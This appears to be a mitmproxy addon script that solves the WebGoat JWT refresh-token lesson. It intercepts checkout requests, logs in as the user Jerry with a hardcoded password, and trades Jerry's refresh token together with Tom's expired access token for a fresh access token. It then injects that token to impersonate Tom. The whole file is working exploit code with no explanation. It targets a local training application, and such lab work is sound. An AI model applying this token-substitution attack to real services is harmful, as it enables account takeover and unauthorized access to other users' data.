from mitmproxy import http
from mitmproxy import ctx

import requests
# from requests import Request, Session

REFRESH_URL = 'http://localhost:8000/WebGoat/JWT/refresh/newToken'

LOGIN_URL = 'http://localhost:8000/WebGoat/JWT/refresh/login'

OLD_TOM_ACCESS_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q'

def request(flow: http.HTTPFlow) -> None:

  if 'refresh/checkout' in flow.request.url:
    headers_copy = flow.request.headers.copy()
    headers_copy['Content-Type'] = 'application/json'
    # Login as another user and get his refresh token.
    resp = requests.post(LOGIN_URL, 
      json={"user":"Jerry","password":"bm5nhSkxCXZkKRy4"},
      headers=headers_copy)
    data = resp.json()
    refresh_token = data['refresh_token']

    # Send request for token refresh with Tom's token.
    headers_copy['Authorization'] = 'Bearer ' + OLD_TOM_ACCESS_TOKEN    
    resp = requests.post(REFRESH_URL, 
      json={"refresh_token": refresh_token},
      headers=headers_copy)

    data = resp.json()
    access_token = data['access_token']
    refresh_token = data['refresh_token']

    flow.request.headers['Authorization'] = 'Bearer ' + access_token

def response(flow: http.HTTPFlow) -> None:
  return
